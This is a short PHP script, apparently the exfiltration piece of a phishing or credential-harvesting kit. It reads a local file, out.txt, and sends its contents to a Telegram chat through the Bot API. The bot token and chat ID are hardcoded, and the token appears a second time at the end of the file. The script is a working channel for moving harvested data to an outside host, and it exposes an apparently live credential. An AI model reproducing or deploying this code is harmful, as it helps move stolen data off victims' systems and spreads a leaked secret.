<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1538764955:AAGXAA-malZR8x_2yHg6K2xXKd7yNoGJGnQ/sendMessage?chat_id=949935494&text=$msg");

?>






1538764955:AAGXAA-malZR8x_2yHg6K2xXKd7yNoGJGnQ